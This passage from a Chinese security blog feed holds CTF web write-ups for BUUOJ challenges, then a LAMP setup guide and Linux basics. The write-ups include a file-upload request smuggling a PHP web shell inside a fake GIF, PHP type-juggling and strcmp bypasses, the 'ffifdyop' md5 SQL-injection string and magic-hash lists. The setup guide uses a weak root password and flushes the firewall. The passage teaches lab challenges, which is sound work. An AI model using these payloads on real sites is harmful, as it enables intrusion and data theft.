class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------55100373822564074781056694082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>394</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=1761c7d1b1462-0f5e806b80c1f4-4c3f2779-18b040-1761c7d1b15293</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------55100373822564074781056694082</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;x.phtml&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval(system($_GET[&#x27;M0th&#x27;]));phpinfo();?&gt;</span><br><span class="line">-----------------------------55100373822564074781056694082</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">-----------------------------55100373822564074781056694082--</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cn&#x2F;uplo4d&#x2F;838cf4020bc77e8f974f2835f3ae4c1a.phtml?M0th&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>bak隐藏文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;195c9eff-d41f-4009-938c-528249666a40.node3.buuoj.cn&#x2F;?key&#x3D;123</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p>直接给源码了, strcmp通过数组来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pay.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3fb81d90-0ba8-44f1-bc6f-ce1d696ba7e9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://3fb81d90-0ba8-44f1-bc6f-ce1d696ba7e9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://3fb81d90-0ba8-44f1-bc6f-ce1d696ba7e9.node3.buuoj.cn/pay.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=177f24714762d6-07ad73289ec17-53e356a-144000-177f24714776fd; user=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">password=404a&amp;money[]=100000000</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的弱类型绕过</p><p><img src="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210317221726820.png" class="lazyload" data-srcset="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210317221726820.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317221726820"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 签到题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF2020]Easy MD5</title>
      <link href="2020/05/14/BJDCTF2020-Easy-MD5/"/>
      <url>2020/05/14/BJDCTF2020-Easy-MD5/</url>
      
        <content type="html"><![CDATA[<p>这个题涉及到一个很小很特别的点，而且感觉也挺有实用场景的</p><span id="more"></span><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这题设计到一个我不知道的知识，记录一下<br>所查大佬的博客连接：<br><a href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a><br><a href="https://www.cnblogs.com/h3zh1/p/12656446.html">https://www.cnblogs.com/h3zh1/p/12656446.html</a></p><h2 id="尝试之路加wp"><a href="#尝试之路加wp" class="headerlink" title="尝试之路加wp"></a>尝试之路加wp</h2><p>卡在第一步emmmm<br><img src="https://img-blog.csdnimg.cn/20200514214952946.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200514214952946.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>应该输入一个万能密码尝试过爆破无果<br>大佬们的输入是 ffifdyop<br>然后进入第二层<br><img src="https://img-blog.csdnimg.cn/20200514215113859.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200514215113859.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>很常规 数组或者0e碰撞<br>进入第三层<br><img src="https://img-blog.csdnimg.cn/20200514215143228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200514215143228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">数组绕过</p><h2 id="知识点0x01—-md5-password-true"><a href="#知识点0x01—-md5-password-true" class="headerlink" title="知识点0x01—-md5($password,true)"></a>知识点0x01—-md5($password,true)</h2><p><img src="https://img-blog.csdnimg.cn/20200514215305631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200514215305631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">而</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: <span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: <span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9<span class="operator">!</span>r,\xf9\xedb\x1c</span><br><span class="line">string: <span class="string">&#x27;or&#x27;</span><span class="number">6</span>]<span class="operator">!</span>r,b</span><br></pre></td></tr></table></figure><p>与原来的语句进行了拼接<br>即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#x27;admin&#x27; where password=&#x27; &quot;.md5($pass,<span class="literal">true</span>).&quot; &#x27; &quot;</span><br></pre></td></tr></table></figure><p>拼接成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#x27;admin&#x27; where password=&#x27;&#x27; or&#x27;6蒥欓!r,b&#x27; &quot;</span><br></pre></td></tr></table></figure><p>而or 后第一字符是非0数字字符 会被认为是ture<br>进而实现无密码登入</p><h2 id="记录一下几组md5碰撞值备用"><a href="#记录一下几组md5碰撞值备用" class="headerlink" title="记录一下几组md5碰撞值备用"></a>记录一下几组md5碰撞值备用</h2><p>0e开头的md5和原值：<br>QNKCDZO</p><p>0e830400451993494058024219903391</p><p>240610708</p><p>314282422</p><p>571579406</p><p>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="number">11111111111</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$str1</span>=md5(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>,<span class="variable">$str1</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5弱相等 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最简单的lamp环境搭建</title>
      <link href="2020/05/11/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84lamp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>2020/05/11/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84lamp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>从入门第一步学姐要求在linux上搭建一个lamp环境，当时很迷，什么都不会，花了好久才弄完，最近接触到一种非常简便的lamp搭建方式，记录一下</p><span id="more"></span><h2 id="什么是lamp"><a href="#什么是lamp" class="headerlink" title="什么是lamp"></a>什么是lamp</h2><p>l 是 linux操作系统<br>a 是apache web服务器<br>m 是mysql 数据库<br>p 是php 语言<br>lamp就是基于以上的一种网站部署的环境</p><h2 id="搭建过程（本次使用红帽linux，其他linux也类似）"><a href="#搭建过程（本次使用红帽linux，其他linux也类似）" class="headerlink" title="搭建过程（本次使用红帽linux，其他linux也类似）"></a>搭建过程（本次使用红帽linux，其他linux也类似）</h2><p><strong>配置yum源</strong></p><p>用vi编辑器修改<br> <code>vi /etc/yum.repos.d/rhel-source.repo</code><br> 修改成如下<br> <img src="https://img-blog.csdnimg.cn/20200511160153902.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511160153902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>用镜像光盘自带的包就可以<br><strong>一个命令搞定安装</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="literal">-y</span> install httpd php mysql mysql<span class="literal">-server</span> php<span class="literal">-mysql</span></span><br></pre></td></tr></table></figure><p><strong>启动服务</strong><br>service httpd start<br>service mysqld start<br><strong>配置数据库密码</strong><br>mysqladmin -u root password 123456<br><strong>清空防火墙策略</strong><br>iptables -F<br>访问即可<br><img src="https://img-blog.csdnimg.cn/20200511174315157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511174315157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统基础</title>
      <link href="2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"/>
      <url>2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>当时学linux上来就是搭建环境，对linux很不熟悉，现在趁着hacker学习这个很好的资源把基础也补一下</p><span id="more"></span><h3 id="Linux系统要点"><a href="#Linux系统要点" class="headerlink" title="Linux系统要点"></a>Linux系统要点</h3><h4 id="内核版本识别"><a href="#内核版本识别" class="headerlink" title="内核版本识别"></a>内核版本识别</h4><p><img src="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1589079703379.png" class="lazyload" data-srcset="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1589079703379.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1589079703379"></p><h4 id="磁盘分区表示"><a href="#磁盘分区表示" class="headerlink" title="磁盘分区表示"></a>磁盘分区表示</h4><p><img src="https://img-blog.csdnimg.cn/20200511153333248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153333248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><h5 id="redhatlinux密码忘了怎么办"><a href="#redhatlinux密码忘了怎么办" class="headerlink" title="redhatlinux密码忘了怎么办"></a>redhatlinux密码忘了怎么办</h5><p>e键进入<br><img src="https://img-blog.csdnimg.cn/20200511153433694.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153433694.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>然后e键<br><img src="https://img-blog.csdnimg.cn/20200511153505113.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153505113.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>选中第二个再按e键<br><img src="https://img-blog.csdnimg.cn/20200511153522158.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153522158.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>输入空格s 回车 </p><p>然后b键进入 kernel<img src="https://img-blog.csdnimg.cn/20200511153535379.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153535379.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><p>得到一个shell 可以修改密码</p><h4 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" 